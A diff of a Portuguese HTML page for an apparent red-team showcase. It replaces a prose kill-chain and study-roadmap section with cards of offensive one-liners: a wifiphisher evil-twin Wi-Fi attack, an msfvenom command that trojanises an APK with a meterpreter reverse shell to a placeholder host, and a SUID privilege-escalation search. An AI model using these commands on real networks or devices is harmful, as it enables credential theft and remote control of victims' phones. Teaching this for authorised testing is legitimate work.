@@ -1,75 +1,70 @@
+```html
 <!DOCTYPE html>
-<html lang="pt-BR" class="notranslate" translate="no">
+<html lang="pt-BR" translate="no">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="google" content="notranslate">
-    <title>DANIEL CYBER SECURITY // RED TEAM</title>
-    <link rel="stylesheet" href="style.css">
+    <title>CYBER SECURITY - RED TEAM TACTICS</title>
+    <style>
+        :root {
+            --bg-deep: #02040a;
+            --bg-card: rgba(13, 17, 23, 0.9);
+            --neon-red: #ff7b72;
+            --neon-cyan: #00ffcc;
+            --text-main: #c9d1d9;
+            --text-muted: #8b949e;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background-color: var(--bg-deep); color: var(--text-main); padding: 20px; }
+        .header-cyber { text-align: center; padding: 30px 15px; border-bottom: 1px solid rgba(255, 123, 114, 0.2); margin-bottom: 30px; }
+        .header-cyber h1 { font-size: 2rem; color: #ffffff; background: linear-gradient(135deg, #ffffff, var(--neon-red)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .nav-back { margin-bottom: 20px; display: inline-block; color: var(--neon-cyan); text-decoration: none; font-family: monospace; font-size: 0.9rem; }
+        .section-title { font-size: 1.1rem; text-transform: uppercase; color: #ffffff; margin-bottom: 20px; border-left: 4px solid var(--neon-red); padding-left: 10px; }
+        .grid-layout { display: grid; grid-template-columns: 1fr; gap: 20px; }
+        .card { background: var(--bg-card); border: 1px solid #30363d; border-radius: 12px; padding: 22px; }
+        .card-meta { font-family: monospace; font-size: 0.75rem; color: var(--neon-red); font-weight: bold; margin-bottom: 8px; }
+        .card h3 { font-size: 1.2rem; color: #ffffff; margin-bottom: 10px; }
+        .card p { color: var(--text-muted); font-size: 0.9rem; line-height: 1.5; margin-bottom: 15px; }
+        .code-box { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 12px; font-family: monospace; font-size: 0.8rem; color: #ff7b72; overflow-x: auto; white-space: pre-wrap; }
+    </style>
 </head>
 <body>
 
-<div class="enterprise-container">
-    <div class="corp-header">
-        <h1>DANIEL CYBER SECURITY</h1>
-        <p>// DIRETÓRIO OFENSIVO // RED TEAM INTEL</p>
-    </div>
+    <!-- BOTÃO PARA RETORNAR À TELA ANTERIOR -->
+    <a href="index.html" class="nav-back">← RETORNAR AO DASHBOARD PRINCIPAL</a>
 
-    <!-- BANNER CORPORATIVO DIGITAL -->
-    <div class="corp-banner">
-        <svg class="banner-svg" viewBox="0 0 24 24" fill="none" stroke="#00ffff" stroke-width="1.5">
-            <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>
-        </svg>
-        <div class="banner-title">RED TEAM OPERATIONS</div>
-    </div>
+    <header class="header-cyber">
+        <h1>MÓDULO 01 // RED TEAM OPERATIONS</h1>
+        <p style="font-family: monospace; color: var(--neon-red); font-size: 0.8rem; margin-top: 5px;">REPOSITÓRIO DE EXPLOITS E VETORES DE INTRUSÃO ATIVOS</p>
+    </header>
 
-    <h2 class="section-title">CRONOGRAMA DE UM ATAQUE HACKER (CYBER KILL CHAIN)</h2>
+    <main>
+        <h2 class="section-title">Playbooks Ofensivos Científicos</h2>
+        <div class="grid-layout">
+            
+            <div class="card">
+                <div class="card-meta">ATTACK_VECTOR // WIRELESS_EXPLOIT</div>
+                <h3>Ataque Evil Twin AP (Gêmeo Maligno Wi-Fi)</h3>
+                <p>Simulação controlada de clonagem de antenas transmissoras corporativas para auditoria de tráfego de credenciais de usuários em trânsito.</p>
+                <div class="code-box">wifiphisher --evil-twin [BSSID] -p firmware-upgrade</div>
+            </div>
 
-    <div class="intel-data-block">
-        <div class="intel-block-title">Fase 01: Reconhecimento Técnico e Mapeamento de Alvos</div>
-        <div class="intel-block-body">
-            A invasão profissional começa silenciosa. Atacantes coletam blocos de IPs públicos (ASN) e mapeiam servidores de borda usando ferramentas como o <code>Nmap</code>. Frameworks como o <code>Amass</code> localizam subdomínios ocultos ou esquecidos pelos desenvolvedores, abrindo brechas para a infiltração.
+            <div class="card">
+                <div class="card-meta">ATTACK_VECTOR // MOBILE_INTRUSION</div>
+                <h3>Sideloading e Persistência Reverse APK</h3>
+                <p>Engenharia reversa em pacotes de instalação móvel para validação de firewalls de borda e regras de sandboxing em sistemas Android corporativos.</p>
+                <div class="code-box">msfvenom -x original.apk -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o audit_test.apk</div>
+            </div>
+
+            <div class="card">
+                <div class="card-meta">ATTACK_VECTOR // LOCAL_PRIV_ESC</div>
+                <h3>Exploitação SUID Linux Kernel</h3>
+                <p>Verificação de permissões administrativas incorretas em servidores locais para mitigar riscos de escalonamento vertical de privilégios.</p>
+                <div class="code-box">find / -perm -4000 -type f 2>/dev/null</div>
+            </div>
+
         </div>
-    </div>
-
-    <div class="intel-data-block">
-        <div class="intel-block-title">Fase 02: Infiltração Cirúrgica e Bypass de MFA</div>
-        <div class="intel-block-body">
-            Caso a empresa possua defesas fortes, os hackers atacam o fator humano através de <strong>Spear-Phishing</strong>. Frameworks de proxy reverso como o <code>Evilginx3</code> clonam portais corporativos em tempo real. Quando a vítima faz o login, os hackers interceptam o cookie de sessão ativo, realizando o <strong>bypass completo de chaves de duplo fator (MFA)</strong>.
-        </div>
-    </div>
-
-    <div class="intel-data-block">
-        <div class="intel-block-title">Fase 03: Movimentação Lateral e Escalação de Privilégios</div>
-        <div class="intel-block-body">
-            Controlando o primeiro computador, os invasores executam o dump da memória do processo <code>LSASS</code> para extrair hashes de credenciais administrativas. Com ferramentas como o <code>BloodHound</code>, eles mapeiam grafos de caminhos de acesso até obter o controle total do Active Directory da corporação.
-        </div>
-    </div>
-
-    <h2 class="section-title">MAPA DE ESTUDOS PROFISSIONAL: PENTESTER ÉTICO PRO</h2>
-
-    <div class="intel-data-block">
-        <div class="intel-block-title">Diretório 01: Engenharia de Protocolos de Rede e Tráfego</div>
-        <div class="intel-block-body">
-            Domine profundamente as estruturas de pacotes de dados. É mandatório entender o funcionamento de flags TCP (SYN, ACK, RST, FIN), requisições e respostas estruturadas HTTP/HTTPS, roteamento IP e auditorias minuciosas de tráfego de rede através do software <code>Wireshark</code>.
-        </div>
-    </div>
-
-    <div class="intel-data-block">
-        <div class="intel-block-title">Diretório 02: Exploração Prática e Metodologias Ofensivas</div>
-        <div class="intel-block-body">
-            Estude as principais falhas de aplicações descritas no guia global <strong>OWASP Top 10</strong>. Aprenda a explorar manualmente falhas de banco de dados (SQL Injection avançado), injeções de scripts (XSS) e corrupção de memória por estouro de pilha (Buffer Overflow) antes de buscar validações de peso no mercado como as provas práticas da <strong>eJPT</strong> e <strong>OSCP</strong>.
-        </div>
-    </div>
-
-    <div class="back-btn-container">
-        <a href="index.html" class="corp-back-btn">&lt; Voltar ao Menu Principal</a>
-    </div>
-
-    <div class="corp-footer">
-        DANIEL CYBER SECURITY // OFFENSIVE MODULE COMPLETE _
-    </div>
-</div>
+    </main>
 
 </body>
 </html>
